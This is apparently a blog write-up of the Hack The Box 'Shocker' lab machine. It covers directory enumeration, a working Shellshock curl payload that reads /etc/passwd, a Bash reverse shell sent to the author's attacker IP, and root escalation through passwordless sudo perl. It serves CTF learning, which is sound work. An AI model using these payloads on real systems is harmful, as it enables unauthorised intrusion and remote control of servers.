---
layout: post
title: "HTB - Shocker"
author: "joelczk"
tags: HTB
excerpt_separator: <!--more-->
---

I've just completed CAP from HTB! In my opinion, Shocker is a relatively simple machine to do and the name literally suggests what exploit it is all about:) In this writeup, I will share more about how I went about tackling this box. 

<!--more-->

## HTB - Shocker
**Box** : Shocker\
**IP Address** : 10.10.10.56\
**Operating System** : Linux

## Remarks

- I wasted a lot of time trying to enumerate using wrong wordlists. So, guys here's a pro tip: USE THE CORRECT WORDLISTS (YOU WILL SAVE A LOT OF TIME)
- The name of this machine should have given a big hint on the exploit

## Enumeration
As with every other machine, we will start off by doing a Nmap scan on the IP address. For this machine, there is nothing special that can be discovered from the Nmap scan except for the fact that we have a web service running on port 80.

So next, we will go on to discover the possible endpoints on the web service. To do so, we will be enumerating the files and directories on the website using `gobuster`. What is interesting is that, we have discovered a `cgi-bin` directory on this website.
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirb/common.txt -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/08/14 15:00:29 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.10.56/.hta                 (Status: 403) [Size: 290]
http://10.10.10.56/.htaccess            (Status: 403) [Size: 295]
http://10.10.10.56/.htpasswd            (Status: 403) [Size: 295]
http://10.10.10.56/cgi-bin/             (Status: 403) [Size: 294]
http://10.10.10.56/index.html           (Status: 200) [Size: 137]
http://10.10.10.56/server-status        (Status: 403) [Size: 299]
                                                                 
===============================================================
2021/08/14 15:00:57 Finished
===============================================================
```

Next, we will go on to continue digging the `cgi-bin` directory for possible files using `gobuster`. From the output, we are able to know that the directory contains a `user.sh` file. 
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x .txt,.php,.pl,.cgi,.c,.sh -e -k -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.56/cgi-bin/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              c,sh,txt,php,pl,cgi
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/08/14 15:03:38 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.10.56/cgi-bin/.htpasswd            (Status: 403) [Size: 303]
http://10.10.10.56/cgi-bin/.htaccess.c          (Status: 403) [Size: 305]
http://10.10.10.56/cgi-bin/.hta.cgi             (Status: 403) [Size: 302]
http://10.10.10.56/cgi-bin/.htpasswd.txt        (Status: 403) [Size: 307]
http://10.10.10.56/cgi-bin/.htaccess.sh         (Status: 403) [Size: 306]
http://10.10.10.56/cgi-bin/.hta.c               (Status: 403) [Size: 300]
http://10.10.10.56/cgi-bin/.htpasswd.php        (Status: 403) [Size: 307]
http://10.10.10.56/cgi-bin/.htaccess            (Status: 403) [Size: 303]
http://10.10.10.56/cgi-bin/.hta                 (Status: 403) [Size: 298]
http://10.10.10.56/cgi-bin/.htpasswd.pl         (Status: 403) [Size: 306]
http://10.10.10.56/cgi-bin/.htaccess.txt        (Status: 403) [Size: 307]
http://10.10.10.56/cgi-bin/.hta.sh              (Status: 403) [Size: 301]
http://10.10.10.56/cgi-bin/.htpasswd.cgi        (Status: 403) [Size: 307]
http://10.10.10.56/cgi-bin/.htaccess.php        (Status: 403) [Size: 307]
http://10.10.10.56/cgi-bin/.hta.txt             (Status: 403) [Size: 302]
http://10.10.10.56/cgi-bin/.htpasswd.c          (Status: 403) [Size: 305]
http://10.10.10.56/cgi-bin/.htaccess.pl         (Status: 403) [Size: 306]
http://10.10.10.56/cgi-bin/.hta.php             (Status: 403) [Size: 302]
http://10.10.10.56/cgi-bin/.htpasswd.sh         (Status: 403) [Size: 306]
http://10.10.10.56/cgi-bin/.htaccess.cgi        (Status: 403) [Size: 307]
http://10.10.10.56/cgi-bin/.hta.pl              (Status: 403) [Size: 301]
http://10.10.10.56/cgi-bin/user.sh              (Status: 200) [Size: 118]
                                                                         
===============================================================
2021/08/14 15:06:40 Finished
===============================================================
```

We will keep the presence of `cgi-bin/user.sh` file in mind and we will go on to scan the website for possible vulnerabilities using `Nikto`. From the scan, we also know that the web service is using an outdated version of `Apache`

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.56
+ Target Hostname:    10.10.10.56
+ Target Port:        80
+ Start Time:         2021-08-14 13:49:49 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
```

With the information that we are using an outdated `Apache` version and the presence of `cgi-bin/user.sh` file (plus the name of course!!), we can reasonably suspect that this box is vulnerable to Shell Shock exploit. We will first test a POC for the exploit. 

```
┌──(kali㉿kali)-[~]
└─$ curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.10.10.56/cgi-bin/user.sh

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
```

Since we manage to successfully exfiltrate the `/etc/passwd` payload, we can now create a reverse shell payload to connect to our attacker machine. 

```
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.250/3000 0>&1'" http://10.10.10.56/cgi-bin/user.sh
```

## Obtaining user flag
After obtaining the reverse shell, we will have to first stabilize the shell. 

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 3000       
listening on [any] 3000 ...
connect to [10.10.16.250] from (UNKNOWN) [10.10.10.56] 56940
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ python3 -c 'import pty; pty.spawn("/bin/bash")'
<-bin$ python3 -c 'import pty; pty.spawn("/bin/bash)'                        
shelly@Shocker:/usr/lib/cgi-bin$ export TERM=xterm
export TERM=xterm
shelly@Shocker:/usr/lib/cgi-bin$ stty cols 132 rows 34
stty cols 132 rows 34
shelly@Shocker:/usr/lib/cgi-bin$ 
```

Finally, we will obtain the user flag

```
shelly@Shocker:/$ ls
ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
shelly@Shocker:/$ cd home
cd home
shelly@Shocker:/home$ ls
ls
shelly
shelly@Shocker:/home$ cd shelly
cd shelly
shelly@Shocker:/home/shelly$ ls
ls
user.txt
shelly@Shocker:/home/shelly$ cat user.txt
cat user.txt
<Redacted user flag>
```

## Obtaining the system flag
Unfortunately, we are not done yet! We still do not know the system flag. So, let's find out the programs that run with root privileges. From the output, we realize that `/usr/bin/perl` can be executed with root privileges and without any authentication!

```
shelly@Shocker:/home/shelly$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```


All that is left is for us to execute a `/bin/bash` command using `/usr/bin/per` to obtain the system flag.

```
shelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e 'exec "/bin/bash";'
sudo /usr/bin/perl -e 'exec "/bin/bash";'
root@Shocker:/home/shelly# cd ..
cd ..
root@Shocker:/home# cd ..
cd ..
root@Shocker:~# cat root.txt
cat root.txt
<Redacted system flag>
root@Shocker:~# 
```